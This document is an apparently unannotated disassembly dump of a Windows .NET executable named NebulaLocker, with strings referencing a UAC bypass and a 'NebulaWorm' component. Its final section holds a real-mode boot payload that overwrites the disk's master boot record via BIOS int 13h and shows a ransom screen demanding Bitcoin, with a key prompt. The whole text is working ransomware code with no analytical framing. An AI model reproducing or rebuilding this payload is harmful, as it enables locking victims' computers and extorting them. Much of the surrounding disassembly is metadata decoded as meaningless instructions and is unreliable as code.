  403cb2:	08 00                	or     %al,(%eax)
  403cb4:	04 09                	add    $0x9,%al
  403cb6:	08 02                	or     %al,(%edx)
  403cb8:	02 10                	add    (%eax),%dl
  403cba:	02 03                	add    (%ebx),%al
  403cbc:	00 00                	add    %al,(%eax)
  403cbe:	01 06                	add    %eax,(%esi)
  403cc0:	00 01                	add    %al,(%ecx)
  403cc2:	12 51 1d             	adc    0x1d(%ecx),%dl
  403cc5:	0e                   	push   %cs
  403cc6:	05 00 01 01 1d       	add    $0x1d010100,%eax
  403ccb:	0e                   	push   %cs
  403ccc:	05 00 01 12 51       	add    $0x51120100,%eax
  403cd1:	0e                   	push   %cs
  403cd2:	08 01                	or     %al,(%ecx)
  403cd4:	00 08                	add    %cl,(%eax)
  403cd6:	00 00                	add    %al,(%eax)
  403cd8:	00 00                	add    %al,(%eax)
  403cda:	00 1e                	add    %bl,(%esi)
  403cdc:	01 00                	add    %eax,(%eax)
  403cde:	01 00                	add    %eax,(%eax)
  403ce0:	54                   	push   %esp
  403ce1:	02 16                	add    (%esi),%dl
  403ce3:	57                   	push   %edi
  403ce4:	72 61                	jb     0x403d47
  403ce6:	70 4e                	jo     0x403d36
  403ce8:	6f                   	outsl  %ds:(%esi),(%dx)
  403ce9:	6e                   	outsb  %ds:(%esi),(%dx)
  403cea:	45                   	inc    %ebp
  403ceb:	78 63                	js     0x403d50
  403ced:	65 70 74             	gs jo  0x403d64
  403cf0:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  403cf7:	77 73                	ja     0x403d6c
  403cf9:	01 08                	add    %ecx,(%eax)
  403cfb:	01 00                	add    %eax,(%eax)
  403cfd:	02 00                	add    (%eax),%al
  403cff:	00 00                	add    %al,(%eax)
  403d01:	00 00                	add    %al,(%eax)
  403d03:	11 01                	adc    %eax,(%ecx)
  403d05:	00 0c 4e             	add    %cl,(%esi,%ecx,2)
  403d08:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  403d0c:	61                   	popa
  403d0d:	4c                   	dec    %esp
  403d0e:	6f                   	outsl  %ds:(%esi),(%dx)
  403d0f:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  403d12:	72 00                	jb     0x403d14
  403d14:	00 05 01 00 00 00    	add    %al,0x1
  403d1a:	00 17                	add    %dl,(%edi)
  403d1c:	01 00                	add    %eax,(%eax)
  403d1e:	12 43 6f             	adc    0x6f(%ebx),%al
  403d21:	70 79                	jo     0x403d9c
  403d23:	72 69                	jb     0x403d8e
  403d25:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
  403d2b:	20 20                	and    %ah,(%eax)
  403d2d:	32 30                	xor    (%eax),%dh
  403d2f:	32 35 00 00 29 01    	xor    0x1290000,%dh
  403d35:	00 24 34             	add    %ah,(%esp,%esi,1)
  403d38:	30 36                	xor    %dh,(%esi)
  403d3a:	37                   	aaa
  403d3b:	65 39 65 33          	cmp    %esp,%gs:0x33(%ebp)
  403d3f:	2d 38 65 30 62       	sub    $0x62306538,%eax
  403d44:	2d 34 64 61 33       	sub    $0x33616434,%eax
  403d49:	2d 61 62 65 62       	sub    $0x62656261,%eax
  403d4e:	2d 62 63 34 31       	sub    $0x31346362,%eax
  403d53:	63 37                	arpl   %esi,(%edi)
  403d55:	64 62 39             	bound  %edi,%fs:(%ecx)
  403d58:	63 61 35             	arpl   %esp,0x35(%ecx)
  403d5b:	00 00                	add    %al,(%eax)
  403d5d:	0c 01                	or     $0x1,%al
  403d5f:	00 07                	add    %al,(%edi)
  403d61:	31 2e                	xor    %ebp,(%esi)
  403d63:	30 2e                	xor    %ch,(%esi)
  403d65:	30 2e                	xor    %ch,(%esi)
  403d67:	30 00                	xor    %al,(%eax)
  403d69:	00 4d 01             	add    %cl,0x1(%ebp)
  403d6c:	00 1c 2e             	add    %bl,(%esi,%ebp,1)
  403d6f:	4e                   	dec    %esi
  403d70:	45                   	inc    %ebp
  403d71:	54                   	push   %esp
  403d72:	46                   	inc    %esi
  403d73:	72 61                	jb     0x403dd6
  403d75:	6d                   	insl   (%dx),%es:(%edi)
  403d76:	65 77 6f             	gs ja  0x403de8
  403d79:	72 6b                	jb     0x403de6
  403d7b:	2c 56                	sub    $0x56,%al
  403d7d:	65 72 73             	gs jb  0x403df3
  403d80:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  403d87:	37                   	aaa
  403d88:	2e 32 01             	xor    %cs:(%ecx),%al
  403d8b:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  403d8f:	46                   	inc    %esi
  403d90:	72 61                	jb     0x403df3
  403d92:	6d                   	insl   (%dx),%es:(%edi)
  403d93:	65 77 6f             	gs ja  0x403e05
  403d96:	72 6b                	jb     0x403e03
  403d98:	44                   	inc    %esp
  403d99:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  403da0:	61                   	popa
  403da1:	6d                   	insl   (%dx),%es:(%edi)
  403da2:	65 14 2e             	gs adc $0x2e,%al
  403da5:	4e                   	dec    %esi
  403da6:	45                   	inc    %ebp
  403da7:	54                   	push   %esp
  403da8:	20 46 72             	and    %al,0x72(%esi)
  403dab:	61                   	popa
  403dac:	6d                   	insl   (%dx),%es:(%edi)
  403dad:	65 77 6f             	gs ja  0x403e1f
  403db0:	72 6b                	jb     0x403e1d
  403db2:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  403db5:	37                   	aaa
  403db6:	2e 32 1f             	xor    %cs:(%edi),%bl
  403db9:	01 00                	add    %eax,(%eax)
  403dbb:	1a 55 41             	sbb    0x41(%ebp),%dl
  403dbe:	43                   	inc    %ebx
  403dbf:	42                   	inc    %edx
  403dc0:	79 70                	jns    0x403e32
  403dc2:	61                   	popa
  403dc3:	73 73                	jae    0x403e38
  403dc5:	2b 3c 53             	sub    (%ebx,%edx,2),%edi
  403dc8:	74 61                	je     0x403e2b
  403dca:	72 74                	jb     0x403e40
  403dcc:	41                   	inc    %ecx
  403dcd:	73 79                	jae    0x403e48
  403dcf:	6e                   	outsb  %ds:(%esi),(%dx)
  403dd0:	63 3e                	arpl   %edi,(%esi)
  403dd2:	64 5f                	fs pop %edi
  403dd4:	5f                   	pop    %edi
  403dd5:	30 00                	xor    %al,(%eax)
  403dd7:	00 24 01             	add    %ah,(%ecx,%eax,1)
  403dda:	00 1f                	add    %bl,(%edi)
  403ddc:	4e                   	dec    %esi
  403ddd:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  403de1:	61                   	popa
  403de2:	4c                   	dec    %esp
  403de3:	6f                   	outsl  %ds:(%esi),(%dx)
  403de4:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  403de7:	72 2e                	jb     0x403e17
  403de9:	50                   	push   %eax
  403dea:	72 6f                	jb     0x403e5b
  403dec:	67 72 61             	addr16 jb 0x403e50
  403def:	6d                   	insl   (%dx),%es:(%edi)
  403df0:	2b 3c 4d 61 69 6e 3e 	sub    0x3e6e6961(,%ecx,2),%edi
  403df7:	64 5f                	fs pop %edi
  403df9:	5f                   	pop    %edi
  403dfa:	31 00                	xor    %eax,(%eax)
  403dfc:	00 34 01             	add    %dh,(%ecx,%eax,1)
  403dff:	00 2f                	add    %ch,(%edi)
  403e01:	4e                   	dec    %esi
  403e02:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  403e06:	61                   	popa
  403e07:	57                   	push   %edi
  403e08:	6f                   	outsl  %ds:(%esi),(%dx)
  403e09:	72 6d                	jb     0x403e78
  403e0b:	2e 4e                	cs dec %esi
  403e0d:	6f                   	outsl  %ds:(%esi),(%dx)
  403e0e:	74 69                	je     0x403e79
  403e10:	66 69 65 72 2b 3c    	imul   $0x3c2b,0x72(%ebp),%sp
  403e16:	4e                   	dec    %esi
  403e17:	6f                   	outsl  %ds:(%esi),(%dx)
  403e18:	74 69                	je     0x403e83
  403e1a:	66 79 46             	data16 jns 0x403e63
  403e1d:	69 6c 65 4f 70 65 6e 	imul   $0x656e6570,0x4f(%ebp,%eiz,2),%ebp
  403e24:	65 
  403e25:	64 41                	fs inc %ecx
  403e27:	73 79                	jae    0x403ea2
  403e29:	6e                   	outsb  %ds:(%esi),(%dx)
  403e2a:	63 3e                	arpl   %edi,(%esi)
  403e2c:	64 5f                	fs pop %edi
  403e2e:	5f                   	pop    %edi
  403e2f:	31 00                	xor    %eax,(%eax)
  403e31:	00 00                	add    %al,(%eax)
  403e33:	00 00                	add    %al,(%eax)
  403e35:	00 00                	add    %al,(%eax)
  403e37:	00 6b ec             	add    %ch,-0x14(%ebx)
  403e3a:	16                   	push   %ss
  403e3b:	9b                   	fwait
  403e3c:	00 00                	add    %al,(%eax)
  403e3e:	00 00                	add    %al,(%eax)
  403e40:	02 00                	add    (%eax),%al
  403e42:	00 00                	add    %al,(%eax)
  403e44:	66 00 00             	data16 add %al,(%eax)
  403e47:	00 6c 3e 00          	add    %ch,0x0(%esi,%edi,1)
  403e4b:	00 6c 20 00          	add    %ch,0x0(%eax,%eiz,1)
	...
  403e5b:	00 10                	add    %dl,(%eax)
	...
  403e69:	00 00                	add    %al,(%eax)
  403e6b:	00 52 53             	add    %dl,0x53(%edx)
  403e6e:	44                   	inc    %esp
  403e6f:	53                   	push   %ebx
  403e70:	d8 6c f9 86          	fsubrs -0x7a(%ecx,%edi,8)
  403e74:	d4 f9                	aam    $0xf9
  403e76:	52                   	push   %edx
  403e77:	45                   	inc    %ebp
  403e78:	95                   	xchg   %eax,%ebp
  403e79:	50                   	push   %eax
  403e7a:	20 6f 19             	and    %ch,0x19(%edi)
  403e7d:	15 06 19 01 00       	adc    $0x11906,%eax
  403e82:	00 00                	add    %al,(%eax)
  403e84:	43                   	inc    %ebx
  403e85:	3a 5c 55 73          	cmp    0x73(%ebp,%edx,2),%bl
  403e89:	65 72 73             	gs jb  0x403eff
  403e8c:	5c                   	pop    %esp
  403e8d:	49                   	dec    %ecx
  403e8e:	7a 6f                	jp     0x403eff
  403e90:	6c                   	insb   (%dx),%es:(%edi)
  403e91:	79 5c                	jns    0x403eef
  403e93:	44                   	inc    %esp
  403e94:	65 73 6b             	gs jae 0x403f02
  403e97:	74 6f                	je     0x403f08
  403e99:	70 5c                	jo     0x403ef7
  403e9b:	4e                   	dec    %esi
  403e9c:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  403ea0:	61                   	popa
  403ea1:	4c                   	dec    %esp
  403ea2:	6f                   	outsl  %ds:(%esi),(%dx)
  403ea3:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  403ea6:	72 5c                	jb     0x403f04
  403ea8:	4e                   	dec    %esi
  403ea9:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  403ead:	61                   	popa
  403eae:	4c                   	dec    %esp
  403eaf:	6f                   	outsl  %ds:(%esi),(%dx)
  403eb0:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  403eb3:	72 5c                	jb     0x403f11
  403eb5:	6f                   	outsl  %ds:(%esi),(%dx)
  403eb6:	62 6a 5c             	bound  %ebp,0x5c(%edx)
  403eb9:	52                   	push   %edx
  403eba:	65 6c                	gs insb (%dx),%es:(%edi)
  403ebc:	65 61                	gs popa
  403ebe:	73 65                	jae    0x403f25
  403ec0:	5c                   	pop    %esp
  403ec1:	4e                   	dec    %esi
  403ec2:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  403ec6:	61                   	popa
  403ec7:	4c                   	dec    %esp
  403ec8:	6f                   	outsl  %ds:(%esi),(%dx)
  403ec9:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  403ecc:	72 2e                	jb     0x403efc
  403ece:	70 64                	jo     0x403f34
  403ed0:	62 00                	bound  %eax,(%eax)
  403ed2:	fa                   	cli
  403ed3:	3e 00 00             	add    %al,%ds:(%eax)
	...
  403ede:	14 3f                	adc    $0x3f,%al
  403ee0:	00 00                	add    %al,(%eax)
  403ee2:	00 20                	add    %ah,(%eax)
	...
  403ef8:	00 00                	add    %al,(%eax)
  403efa:	06                   	push   %es
  403efb:	3f                   	aas
	...
  403f08:	5f                   	pop    %edi
  403f09:	43                   	inc    %ebx
  403f0a:	6f                   	outsl  %ds:(%esi),(%dx)
  403f0b:	72 45                	jb     0x403f52
  403f0d:	78 65                	js     0x403f74
  403f0f:	4d                   	dec    %ebp
  403f10:	61                   	popa
  403f11:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  403f18:	72 65                	jb     0x403f7f
  403f1a:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  403f1e:	6c                   	insb   (%dx),%es:(%edi)
  403f1f:	00 00                	add    %al,(%eax)
  403f21:	00 00                	add    %al,(%eax)
  403f23:	00 00                	add    %al,(%eax)
  403f25:	00 ff                	add    %bh,%bh
  403f27:	25 00 20 40 00       	and    $0x402000,%eax
  403f2c:	00 00                	add    %al,(%eax)
  403f2e:	00 00                	add    %al,(%eax)
  403f30:	b8 03 00 cd 10       	mov    $0x10cd0003,%eax
  403f35:	be 90 7c e8 5a       	mov    $0x5ae87c90,%esi
  403f3a:	00 be 50 7d e8 54    	add    %bh,0x54e87d50(%esi)
  403f40:	00 bf 8e 7d b9 07    	add    %bh,0x7b97d8e(%edi)
  403f46:	00 e8                	add    %ch,%al
  403f48:	57                   	push   %edi
  403f49:	00 aa e2 fa b0 00    	add    %ch,0xb0fae2(%edx)
  403f4f:	aa                   	stos   %al,%es:(%edi)
  403f50:	be 8e 7d bf 86       	mov    $0x86bf7d8e,%esi
  403f55:	7d e8                	jge    0x403f3f
  403f57:	51                   	push   %ecx
  403f58:	00 72 32             	add    %dh,0x32(%edx)
  403f5b:	be 5c 7d e8 34       	mov    $0x34e87d5c,%esi
  403f60:	00 b4 02 b0 01 b5 00 	add    %dh,0xb501b0(%edx,%eax,1)
  403f67:	b1 02                	mov    $0x2,%cl
  403f69:	b6 00                	mov    $0x0,%dh
  403f6b:	b2 80                	mov    $0x80,%dl
  403f6d:	bb 00 06 8e c3       	mov    $0xc38e0600,%ebx
  403f72:	31 db                	xor    %ebx,%ebx
  403f74:	cd 13                	int    $0x13
  403f76:	b4 03                	mov    $0x3,%ah
  403f78:	b0 01                	mov    $0x1,%al
  403f7a:	b5 00                	mov    $0x0,%ch
  403f7c:	b1 01                	mov    $0x1,%cl
  403f7e:	b6 00                	mov    $0x0,%dh
  403f80:	b2 80                	mov    $0x80,%dl
  403f82:	bb 00 06 8e c3       	mov    $0xc38e0600,%ebx
  403f87:	31 db                	xor    %ebx,%ebx
  403f89:	cd 13                	int    $0x13
  403f8b:	eb 31                	jmp    0x403fbe
  403f8d:	be 6b 7d e8 02       	mov    $0x2e87d6b,%esi
  403f92:	00 eb                	add    %ch,%bl
  403f94:	29 ac 08 c0 74 06 b4 	sub    %ebp,-0x4bf98b40(%eax,%ecx,1)
  403f9b:	0e                   	push   %cs
  403f9c:	cd 10                	int    $0x10
  403f9e:	eb f5                	jmp    0x403f95
  403fa0:	c3                   	ret
  403fa1:	b4 00                	mov    $0x0,%ah
  403fa3:	cd 16                	int    $0x16
  403fa5:	b4 0e                	mov    $0xe,%ah
  403fa7:	cd 10                	int    $0x10
  403fa9:	c3                   	ret
  403faa:	56                   	push   %esi
  403fab:	57                   	push   %edi
  403fac:	ac                   	lods   %ds:(%esi),%al
  403fad:	ae                   	scas   %es:(%edi),%al
  403fae:	75 06                	jne    0x403fb6
  403fb0:	08 c0                	or     %al,%al
  403fb2:	74 06                	je     0x403fba
  403fb4:	eb f6                	jmp    0x403fac
  403fb6:	f9                   	stc
  403fb7:	5f                   	pop    %edi
  403fb8:	5e                   	pop    %esi
  403fb9:	c3                   	ret
  403fba:	f8                   	clc
  403fbb:	5f                   	pop    %edi
  403fbc:	5e                   	pop    %esi
  403fbd:	c3                   	ret
  403fbe:	eb fe                	jmp    0x403fbe
  403fc0:	4f                   	dec    %edi
  403fc1:	6f                   	outsl  %ds:(%esi),(%dx)
  403fc2:	70 73                	jo     0x404037
  403fc4:	21 0d 0a 59 6f 75    	and    %ecx,0x756f590a
  403fca:	20 42 65             	and    %al,0x65(%edx)
  403fcd:	63 61 6d             	arpl   %esp,0x6d(%ecx)
  403fd0:	65 20 56 69          	and    %dl,%gs:0x69(%esi)
  403fd4:	63 74 69 6d          	arpl   %esi,0x6d(%ecx,%ebp,2)
  403fd8:	20 4f 66             	and    %cl,0x66(%edi)
  403fdb:	20 4e 65             	and    %cl,0x65(%esi)
  403fde:	62 75 6c             	bound  %esi,0x6c(%ebp)
  403fe1:	61                   	popa
  403fe2:	4c                   	dec    %esp
  403fe3:	6f                   	outsl  %ds:(%esi),(%dx)
  403fe4:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  403fe7:	72 21                	jb     0x40400a
  403fe9:	0d 0a 2d 2d 2d       	or     $0x2d2d2d0a,%eax
  403fee:	2d 2d 2d 2d 2d       	sub    $0x2d2d2d2d,%eax
  403ff3:	2d 2d 2d 2d 2d       	sub    $0x2d2d2d2d,%eax
  403ff8:	2d 2d 2d 2d 2d       	sub    $0x2d2d2d2d,%eax
  403ffd:	2d 2d 2d 2d 2d       	sub    $0x2d2d2d2d,%eax
  404002:	2d 2d 2d 2d 2d       	sub    $0x2d2d2d2d,%eax
  404007:	2d 2d 2d 2d 2d       	sub    $0x2d2d2d2d,%eax
  40400c:	2d 2d 2d 2d 2d       	sub    $0x2d2d2d2d,%eax
  404011:	2d 2d 2d 2d 2d       	sub    $0x2d2d2d2d,%eax
  404016:	2d 2d 2d 2d 2d       	sub    $0x2d2d2d2d,%eax
  40401b:	0d 0a 57 68 61       	or     $0x6168570a,%eax
  404020:	74 20                	je     0x404042
  404022:	48                   	dec    %eax
  404023:	61                   	popa
  404024:	70 70                	jo     0x404096
  404026:	65 6e                	outsb  %gs:(%esi),(%dx)
  404028:	65 64 3f             	gs fs aas
  40402b:	0d 0a 54 68 69       	or     $0x6968540a,%eax
  404030:	73 20                	jae    0x404052
  404032:	49                   	dec    %ecx
  404033:	73 20                	jae    0x404055
  404035:	4e                   	dec    %esi
  404036:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  40403a:	61                   	popa
  40403b:	4c                   	dec    %esp
  40403c:	6f                   	outsl  %ds:(%esi),(%dx)
  40403d:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  404040:	72 2e                	jb     0x404070
  404042:	20 59 6f             	and    %bl,0x6f(%ecx)
  404045:	75 72                	jne    0x4040b9
  404047:	20 50 43             	and    %dl,0x43(%eax)
  40404a:	20 49 73             	and    %cl,0x73(%ecx)
  40404d:	20 4c 6f 63          	and    %cl,0x63(%edi,%ebp,2)
  404051:	6b 65 64 0d          	imul   $0xd,0x64(%ebp),%esp
  404055:	0a 57 61             	or     0x61(%edi),%dl
  404058:	6e                   	outsb  %ds:(%esi),(%dx)
  404059:	74 20                	je     0x40407b
  40405b:	59                   	pop    %ecx
  40405c:	6f                   	outsl  %ds:(%esi),(%dx)
  40405d:	75 72                	jne    0x4040d1
  40405f:	20 44 61 74          	and    %al,0x74(%ecx,%eiz,2)
  404063:	61                   	popa
  404064:	3f                   	aas
  404065:	20 50 61             	and    %dl,0x61(%eax)
  404068:	79 20                	jns    0x40408a
  40406a:	42                   	inc    %edx
  40406b:	69 74 63 6f 69 6e 20 	imul   $0x74206e69,0x6f(%ebx,%eiz,2),%esi
  404072:	74 
  404073:	6f                   	outsl  %ds:(%esi),(%dx)
  404074:	20 75 6e             	and    %dh,0x6e(%ebp)
  404077:	6c                   	insb   (%dx),%es:(%edi)
  404078:	6f                   	outsl  %ds:(%esi),(%dx)
  404079:	63 6b 20             	arpl   %ebp,0x20(%ebx)
  40407c:	21 0d 0a 00 45 6e    	and    %ecx,0x6e45000a
  404082:	74 65                	je     0x4040e9
  404084:	72 20                	jb     0x4040a6
  404086:	4b                   	dec    %ebx
  404087:	65 79 3a             	gs jns 0x4040c4
  40408a:	20 00                	and    %al,(%eax)
  40408c:	0d 0a 43 6f 72       	or     $0x726f430a,%eax
  404091:	72 65                	jb     0x4040f8
  404093:	63 74 20 4b          	arpl   %esi,0x4b(%eax,%eiz,1)
  404097:	65 79 21             	gs jns 0x4040bb
  40409a:	00 0d 0a 57 72 6f    	add    %cl,0x6f72570a
  4040a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4040a1:	67 20 4b 65          	and    %cl,0x65(%bp,%di)
  4040a5:	79 21                	jns    0x4040c8
  4040a7:	20 53 74             	and    %dl,0x74(%ebx)
  4040aa:	69 6c 6c 20 4c 6f 63 	imul   $0x6b636f4c,0x20(%esp,%ebp,2),%ebp
  4040b1:	6b 
  4040b2:	65 64 21 00          	gs and %eax,%fs:(%eax)
  4040b6:	4e                   	dec    %esi
  4040b7:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  4040bb:	61                   	popa
  4040bc:	4f                   	dec    %edi
	...
